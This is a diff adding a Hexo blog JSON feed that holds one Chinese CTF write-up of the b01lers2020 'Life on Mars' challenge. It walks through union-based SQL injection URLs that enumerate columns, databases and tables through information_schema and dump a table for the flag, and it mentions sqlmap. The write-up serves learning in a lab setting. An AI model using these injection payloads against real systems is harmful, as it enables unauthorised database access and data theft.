@@ -1,0 +1,20 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"信息搜集（js，网络）\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/06/20/Mars/",
+            "url": "http://odiws.github.io/2024/06/20/Mars/",
+            "title": "[b01lers2020]lifeMars",
+            "date_published": "2024-06-20T12:21:48.000Z",
+            "content_html": "<p><img data-src=\"../images/%5Bb01lers2020%5DLifeOnMars/2.png\" alt=\"2\"></p>\n<p>进来是这样的场景：用 f12 进入网络发现有些一样的传参：</p>\n<p><img data-src=\"../images/%5Bb01lers2020%5DLifeOnMars/3.png\" alt=\"3\"></p>\n<p>发现有个 search 的传参：（结合源码（ctrl+u）发现有个 life on mars 这个文件）</p>\n<pre><code>life on mars.js\n\nfunction get_life(query) &#123;\n  $.ajax(&#123;\n    type: &quot;GET&quot;,\n    url: &quot;/query?search=&quot; + query,\n    data: &quot;&#123;&#125;&quot;,\n    contentType: &quot;application/json; charset=utf-8&quot;,\n    dataType: &quot;json&quot;,\n    cache: false,\n    success: function(data) &#123;\n      var table_html =\n        '&lt;table id=&quot;results&quot;&gt;&lt;tr&gt;&lt;th&gt;Name&lt;/th&gt;&lt;th&gt;Description&lt;/th&gt;&lt;/tr&gt;';\n      $.each(data, function(i, item) &#123;\n        table_html +=\n          &quot;&lt;tr&gt;&lt;td&gt;&quot; + data[i][0] + &quot;&lt;/td&gt;&lt;td&gt;&quot; + data[i][1] + &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;\n      &#125;);\n      table_html += &quot;&lt;/table&gt;&quot;;\n\n      $(&quot;#results&quot;).replaceWith(table_html);\n    &#125;,\n\n    error: function(msg) &#123; &#125;\n  &#125;);\n&#125;\n</code></pre>\n<p>该 js 文件返回的是数据集，那么这里一定查询了数据库，那么就可能存在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1zcWwlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw\"> sql 注入漏洞</span>。那就开始 sql 注入的流程。</p>\n<p><code>/query?search=</code>  如果地名输入正确，发现返回如下:</p>\n<p><img data-src=\"../images/%5Bb01lers2020%5DLifeOnMars/4.png\" alt=\"4\"></p>\n<p>开始 SQL 注入：</p>\n<pre><code>有几个字段：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum order by 2\n查询数据库名称：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,database()\n查询数据表：http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT%20group_concat(table_name)%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20=%20%27aliens%27)\n</code></pre>\n<p>到这里就搞不出来了：然后就是</p>\n<h4 id=\"查询所有的数据库\"><a class=\"markdownIt-Anchor\" href=\"#查询所有的数据库\">#</a> 查询所有的数据库</h4>\n<p>在这个查询中，information_schema.schemata 是一个 MySQL 系统表，其中包含所有数据库的信息。执行这个查询后，MySQL 将返回一个包含所有数据库名称的结果集。</p>\n<p>这些命令和查询可以在 MySQL 命令行界面中使用，也可以在 MySQL 客户端或其他数据库工具中使用。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEwMWE0OThjLWNlNGEtNDM2NC05Nzk5LWQ5YmRiMTkxMmY0My5ub2RlNS5idXVvai5jbjo4MS9xdWVyeT9zZWFyY2g9aGVzcGVyaWFfcGxhbnVtJTIwdW5pb24lMjBzZWxlY3QlMjAxLChTRUxFQ1QlMjBncm91cF9jb25jYXQoc2NoZW1hX25hbWUpJTIwRlJPTSUyMGluZm9ybWF0aW9uX3NjaGVtYS5zY2hlbWF0YQ==\">http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=hesperia_planum union select 1,(SELECT group_concat(schema_name) FROM information_schema.schemata</span>)</p>\n<p>还可以：（直接用 sqlmap）：</p>\n<p><img data-src=\"../images/%5Bb01lers2020%5DLifeOnMars/1.png\" alt=\"1\"></p>\n<p>爆出还有一个 alien_code 这个库：（重复上个的操作）</p>\n<p>或者可以：</p>\n<p><img data-src=\"../images/%5Bb01lers2020%5DLifeOnMars/5.png\" alt=\"5\"></p>\n<p>直接有字段名了：</p>\n<p>没有直接给出就手打：</p>\n<pre><code>http://101a498c-ce4a-4364-9799-d9bdb1912f43.node5.buuoj.cn:81/query?search=amazonis_planitia%20union%20select%20group_concat(id),group_concat(code)%20from%20alien_code.code\n</code></pre>\n<p>完成，获得 flag</p>\n",
+            "tags": [
+                "buuctf",
+                "sql注入",
+                "信息搜集（js，网络）"
+            ]
+        }
+    ]
+}
